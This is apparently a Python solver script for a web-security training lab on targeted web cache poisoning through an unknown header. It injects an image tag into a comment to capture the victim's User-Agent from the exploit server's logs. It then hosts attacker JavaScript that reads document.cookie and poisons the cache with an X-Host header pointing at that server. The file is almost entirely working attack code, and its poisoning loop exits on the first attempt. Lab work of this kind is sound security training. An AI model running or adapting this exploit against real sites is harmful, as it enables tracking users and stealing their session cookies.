import requests
import re
from colorama import Fore
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Targeted web cache poisoning using an unknown header"


def run(url, payload=None, proxies=None):
    url = url.rstrip('/')
    exploit_input = input(
        Fore.YELLOW + "[?] Enter the exploit server URL: " + Fore.WHITE).strip()
    exploit_url = exploit_input.rstrip('/')
    exploit_domain = exploit_url.replace("https://", "").replace("/", "")

    print(Fore.WHITE + "[1] Fetching a post page")
    post_page = requests.get(
        f"{url}/post?postId=1", allow_redirects=False, verify=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Extracting the session cookie and the csrf token to post a comment")

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.WHITE +
          "[3] Posting a comment with the injected payload in the comment field")

    payload = f"<img src=https://{exploit_domain}>"
    data = {"comment": payload, "csrf": csrf_token, "postId": "1",
            "name": "mystic_mido", "email": "mystic_mido@gmail.com"}
    cookies = {"session": session}

    requests.post(f"{url}/post/comment", data=data, cookies=cookies,
                  allow_redirects=False, verify=False, proxies=proxies)

    print(Fore.WHITE +
          "[4] Waiting until the victim view comments to extract their User-Agent from server logs")

    user_agent = extract_user_agent_from_logs(exploit_url, proxies)
    print(Fore.WHITE + "Victim's User-Agent: " + Fore.YELLOW + user_agent)

    print(Fore.WHITE +
          "[5] Storing the malicious javascript file on your exploit server")
    response_head = "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8"
    js_file = "alert(document.cookie);"
    data = {
        "responseFile": "/resources/js/tracking.js",
        "responseBody": js_file,
        "responseHead": response_head,
        "formAction": "STORE",
        "urlIsHttps": "on"
    }

    try:
        requests.post(exploit_url, data=data, allow_redirects=False,
                      verify=False, proxies=proxies)
        print(Fore.GREEN + "OK")
        print(Fore.WHITE +
          "[+] wait a minute and refresh the page, lab takes time to mark as solved")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to store JS file: {e}")
        return False

    for counter in range(1, 11):
        print(Fore.WHITE + f"→ Attempt {counter}/10", end='\r', flush=True)
        headers = {"X-Host": exploit_domain, "User-Agent": user_agent}
        try:
            requests.get(f"{url}", headers=headers,
                         allow_redirects=False, verify=False, proxies=proxies)
            return True
        except Exception as e:
            print(Fore.RED + f"\n[!] Error during poisoning: {e}")
            return False

    print(Fore.GREEN + "\nThe main page is poisoned successfully")
    print(Fore.WHITE + "The lab may not be marked as solved automatically for unknown reasons")
    print(Fore.WHITE + "Use the User-Agent string with burp if so")
    return True


def extract_user_agent_from_logs(exploit_url, proxies):
    while (True):
        log_page = requests.get(
            f"{exploit_url}/log", allow_redirects=False, verify=False, proxies=proxies)
        user_agent = re.findall("(Mozilla/5.*Victim.*)&quot;", log_page.text)

        if len(user_agent) != 0:
            return user_agent[0]
        else:
            continue
